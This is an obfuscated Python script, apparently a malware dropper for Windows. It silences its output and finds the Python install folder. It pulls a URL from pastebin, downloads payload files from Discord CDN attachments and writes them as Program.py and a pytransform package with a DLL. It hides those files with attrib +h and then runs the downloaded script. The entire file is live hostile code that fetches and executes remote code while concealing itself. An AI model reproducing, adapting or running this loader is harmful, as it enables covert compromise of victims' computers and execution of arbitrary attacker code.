import sys ,os ,requests ,subprocess #line:1
from pathlib import Path #line:2
from subprocess import CREATE_NO_WINDOW #line:3
filename ="Program.py"#line:5
def stopprint ():#line:8
    sys .stdout =open (os .devnull ,'w')#line:9
def startprint ():#line:11
    sys .stdout =sys .__stdout__ #line:12
def get_folder_contents (OO0O0OOO0O0O0OOOO ):#line:17
	try :#line:18
		O0O000O0OOOOO00O0 =os .listdir (OO0O0OOO0O0O0OOOO )#line:19
		for OOOOO0O00OOOO0OO0 in O0O000O0OOOOO00O0 :#line:20
			if OOOOO0O00OOOO0OO0 .lower ()=="python.exe":#line:21
				return True #line:22
	except :#line:23
		pass #line:24
	return False #line:25
def get_default_path ():#line:27
	try :#line:28
		OO000O000O000O000 =str (Path .home ()/"Videos")#line:29
		return OO000O000O000O000 #line:30
	except Exception as OOO0OO0O00000000O :#line:31
		print (OOO0OO0O00000000O )#line:32
		return None #line:33
def get_new_filepath (O0O0O00O000OO000O ,O00O00O0OOO0OO000 ):#line:35
	return os .path .join (O0O0O00O000OO000O ,O00O00O0OOO0OO000 )#line:36
def get_cdns ():#line:39
	OOOOOO0O0000OO0O0 ="https://cdn.discordapp.com/attachments/1033739850643406918/1034065372279750687/code.txt"#line:40
	OOO0O0OOO00O000OO ="https://cdn.discordapp.com/attachments/1033739850643406918/1034065373315735654/init.txt"#line:41
	O0OOO000OOOO0O0OO ="https://cdn.discordapp.com/attachments/1033739850643406918/1034065372955017306/transform.txt"#line:42
	return OOOOOO0O0000OO0O0 ,OOO0O0OOO00O000OO ,O0OOO000OOOO0O0OO #line:43
def get_cdn ():#line:46
	OOOO0OO0OOO0OO0OO ="https://cdn.discordapp.com/attachments/1033739850643406918/1033742465380913272/source.txt"#line:47
	try :#line:48
		OO00OOOOOO000O0OO =requests .get (f"https://pastebin.com/raw/YnYk7G5y")#line:49
		if OO00OOOOOO000O0OO .status_code ==404 :#line:50
			return OOOO0OO0OOO0OO0OO #line:51
		OOOOOO000O0O0O000 =f"https://cdn.discordapp.com/attachments/"#line:53
		OO00OOOOOO000O0OO =OO00OOOOOO000O0OO .text #line:54
		OOOO0OO0OOO0OO0OO =f"{OOOOOO000O0O0O000}{OO00OOOOOO000O0OO}"#line:55
		print (f"{OOOO0OO0OOO0OO0OO}")#line:56
	except Exception as O0O0OO0OOOO0O000O :#line:58
		print (O0O0OO0OOOO0O000O )#line:59
		pass #line:60
	return OOOO0OO0OOO0OO0OO #line:62
def get_content ():#line:64
	O0OOOO00000OO0O0O ,OO00000OO0OOOO000 ,O0O00OO0OO00OOOOO =get_cdns ()#line:65
	OOO0O0O000O000O0O =requests .get (O0OOOO00000OO0O0O ).text #line:66
	_O0O00O00O00OO0OO0 =requests .get (OO00000OO0OOOO000 ).content #line:67
	_O0OO0OOO00OO0O000 =requests .get (O0O00OO0OO00OOOOO ).content #line:68
	return OOO0O0O000O000O0O ,_O0O00O00O00OO0OO0 ,_O0OO0OOO00OO0O000 #line:69
def write_to_file (OO00O0O0OOOOOO0O0 ,O0OOO0O000000000O ):#line:71
	OOO00O0OO00OO00O0 =open (OO00O0O0OOOOOO0O0 ,"a")#line:72
	OOO00O0OO00OO00O0 .write (O0OOO0O000000000O )#line:73
	OOO00O0OO00OO00O0 .close ()#line:74
def write_bytes (OO0OOO0O0O0OO000O ,OOOOO0O0OO0OOOOO0 ):#line:76
	OO0OO0OO0O00OO00O =Path (OO0OOO0O0O0OO000O )#line:77
	OO0OO0OO0O00OO00O .write_bytes (OOOOO0O0OO0OOOOO0 )#line:78
def hide_file (OOOOO0O0OO0OO00OO ):#line:80
    try :#line:81
        os .system (f"attrib +h {OOOOO0O0OO0OO00OO}")#line:82
    except :#line:83
        pass #line:84
def run_file (O00OOOOO00OO00000 ):#line:86
	print ("Running")#line:89
	O0OO00OO0000OO00O =subprocess .Popen (f"python {O00OOOOO00OO00000}",shell =True ,stdin =None ,stdout =subprocess .PIPE ,stderr =subprocess .PIPE ,close_fds =True )#line:90
	OOOO00O00000OOOO0 ,OOOO0O0000O0OOO00 =O0OO00OO0000OO00O .communicate ()#line:91
	print (f"{OOOO00O00000OOOO0}|{OOOO0O0000O0OOO00}")#line:92
def main ():#line:97
	stopprint()
	O0000O00O0O000OO0 =get_default_path ()#line:99
	print (O0000O00O0O000OO0 )#line:100
	for O0000OO0O0OO00OOO in sys .path :#line:101
		OO00O0OOO0O0OOOO0 =get_folder_contents (O0000OO0O0OO00OOO )#line:103
		if OO00O0OOO0O0OOOO0 ==True :#line:104
			O0000O00O0O000OO0 =O0000OO0O0OO00OOO #line:105
			break #line:106
	O000O0OO00O0OOO00 =get_new_filepath (O0000O00O0O000OO0 ,filename )#line:108
	print (O000O0OO00O0OOO00 )#line:109
	O0O0OO0OOO00000OO ,O0OOO0OOOOOO0OO00 ,O0O000O0OOO0OOOOO =get_content ()#line:110
	if os .path .exists (O000O0OO00O0OOO00 )==True :#line:111
		print ("Already done")#line:112
		return #line:113
	write_to_file (O000O0OO00O0OOO00 ,O0O0OO0OOO00000OO )#line:115
	hide_file (O000O0OO00O0OOO00 )#line:116
	try :#line:117
		O0O0O000OO00OOOOO =get_new_filepath (O0000O00O0O000OO0 ,"pytransform")#line:118
		os .mkdir (O0O0O000OO00OOOOO )#line:119
	except :#line:120
		print ("already done")#line:121
		return #line:122
	OOO0OO00OOOOOO0OO =get_new_filepath (O0O0O000OO00OOOOO ,"__init__.py")#line:124
	write_bytes (OOO0OO00OOOOOO0OO ,O0OOO0OOOOOO0OO00 )#line:125
	O00000O0O0O0OOO0O =get_new_filepath (O0O0O000OO00OOOOO ,"_pytransform.dll")#line:126
	write_bytes (O00000O0O0O0OOO0O ,O0O000O0OOO0OOOOO )#line:127
	hide_file (OOO0OO00OOOOOO0OO )#line:128
	hide_file (O00000O0O0O0OOO0O )#line:129
	hide_file (O0O0O000OO00OOOOO )#line:130
	run_file (O000O0OO00O0OOO00 )#line:132
main ()